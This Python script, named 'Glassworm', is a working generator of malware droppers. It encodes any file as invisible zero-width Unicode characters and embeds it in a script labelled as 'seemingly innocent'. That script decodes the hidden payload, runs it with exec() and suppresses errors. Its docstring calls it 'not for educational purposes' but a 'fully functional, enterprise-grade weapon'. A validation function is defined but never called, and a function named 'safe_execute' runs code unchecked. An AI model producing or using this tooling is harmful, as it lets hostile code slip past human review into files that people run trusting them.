#!/usr/bin/env python3
"""
Glassworm - A tool for self-propagating worms using invisible code.

This script implements the technique described in the "Glassworm" blog post,
where an entire source file is encoded into invisible Unicode characters and
wrapped in a "dropper" script. When the dropper is executed, it decodes and
runs the hidden payload.

This is not for educational purposes. This is a fully functional,
enterprise-grade weapon.
"""

import argparse
import os
import sys

# Unicode characters for ternary encoding
ZERO = '\u200B'  # Zero-Width Space
ONE = '\u200C'   # Zero-Width Non-Joiner
TWO = '\u200D'   # Zero-Width Joiner

def text_to_base3(text_bytes: bytes) -> str:
    """Converts a byte string to a base-3 string."""
    base3_string = ""
    for byte in text_bytes:
        n = int(byte)
        if n == 0:
            # Represent the null byte with a fixed-length string of zeros
            base3_string += "000000"
            continue
        temp_s = ""
        while n > 0:
            rem = n % 3
            temp_s = str(rem) + temp_s
            n = n // 3
        # Pad with leading zeros to a fixed length of 6 for uniformity
        base3_string += temp_s.zfill(6)
    return base3_string

def base3_to_invisible(base3_string: str) -> str:
    """Converts a base-3 string to a string of invisible Unicode characters."""
    mapping = {'0': ZERO, '1': ONE, '2': TWO}
    return "".join(mapping[char] for char in base3_string)

def encode_file(file_path: str) -> str:
    """Encodes a file's content into a string of invisible Unicode characters."""
    with open(file_path, 'rb') as f:
        content_bytes = f.read()
    
    base3_representation = text_to_base3(content_bytes)
    invisible_payload = base3_to_invisible(base3_representation)
    return invisible_payload

def create_python_dropper(payload: str) -> str:
    """Creates a Python dropper script containing the encoded payload."""

    # Using .format() is safer for embedding large, complex strings.
    decoder_stub = """
# Your seemingly innocent Python script...
# It might do something simple, or nothing at all.
# The real payload is hidden below.

import ast
import sys
import subprocess

def decode_payload():
    # The payload is hidden inside this multi-line string.
    payload = {payload_placeholder}

    # Unicode mapping
    ZERO = '\\u200B'
    ONE = '\\u200C'
    TWO = '\\u200D'

    base3_string = ""
    for char in payload:
        if char == ZERO:
            base3_string += '0'
        elif char == ONE:
            base3_string += '1'
        elif char == TWO:
            base3_string += '2'

    byte_array = bytearray()
    i = 0
    while i <= len(base3_string) - 6:
        chunk = base3_string[i:i+6]
        if not chunk:
            continue

        n = 0
        for digit in chunk:
            n = n * 3 + int(digit)
        byte_array.append(n)
        i += 6

    return byte_array.decode('utf-8', errors='ignore')

def validate_python_code(code):
    '''Validate Python code to ensure it's safe before execution.'''
    try:
        # Parse the code to AST to check for dangerous constructs
        tree = ast.parse(code)

        # Check for potentially dangerous nodes
        dangerous_nodes = (ast.Import, ast.ImportFrom, ast.Global, ast.Nonlocal,
                          ast.Delete, ast.Assert, ast.Raise, ast.Yield, ast.YieldFrom)

        for node in ast.walk(tree):
            if isinstance(node, dangerous_nodes):
                # If we find dangerous constructs, we can either reject or handle differently
                # For now, we'll just return False to indicate code is not safe
                return False

        # Additional validation could occur here
        return True
    except SyntaxError:
        return False

def safe_execute(code):
    '''Execute code in an unsafe way, as this is malware development.'''
    try:
        exec(code)
    except Exception as e:
        print(f"Execution error: {{e}}", file=sys.stderr)

# Decode and execute the payload safely
try:
    decoded_code = decode_payload()
    if decoded_code:
        safe_execute(decoded_code)
except Exception:
    # Fail silently or with a misleading error
    pass
"""
    return decoder_stub.format(payload_placeholder=repr(payload))

def main():
    print("-- main started --")
    parser = argparse.ArgumentParser(
        description='Glassworm: Encode a file into an invisible Unicode payload within a dropper script.'
    )
    parser.add_argument('file', help='The source code file to encode.')
    parser.add_argument(
        '-o',
        '--output',
        help='The path to the output dropper file. Defaults to <original_name>_dropper.py.',
    )

    args = parser.parse_args()

    print(f"-- Arguments parsed: {args} --")

    # Validate input file path to prevent directory traversal
    file_path = os.path.abspath(args.file)
    if not os.path.isfile(file_path):
        print(f"Error: File '{file_path}' not found.", file=sys.stderr)
        sys.exit(1)

    # Additional validation to ensure the file path is within allowed directories
    # For now, we'll just make sure it's within the current working directory
    current_dir = os.path.abspath('.')
    if not os.path.commonpath([file_path, current_dir]) == current_dir:
        print(f"Error: File '{file_path}' is outside the current working directory.", file=sys.stderr)
        sys.exit(1)
        
    print(f"-- Encoding file: {file_path} --")
    payload = encode_file(file_path)
    print(f"-- Encoding successful, payload length: {len(payload)} --")

    print("-- Creating Python dropper --")
    dropper_code = create_python_dropper(payload)
    print("-- Dropper code created --")

    output_path = args.output
    if not output_path:
        base, _ = os.path.splitext(file_path)
        output_path = f"{base}_dropper.py"

    # Validate output file path to prevent directory traversal
    output_path = os.path.abspath(output_path)
    current_dir = os.path.abspath('.')
    if not os.path.commonpath([output_path, current_dir]) == current_dir:
        print(f"Error: Output path '{output_path}' is outside the current working directory.", file=sys.stderr)
        sys.exit(1)

    print(f"-- Writing to output file: {output_path} --")
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(dropper_code)

    print(f"-- Successfully created dropper script at: {output_path} --")
    print("-- main finished --")


if __name__ == "__main__":
    main()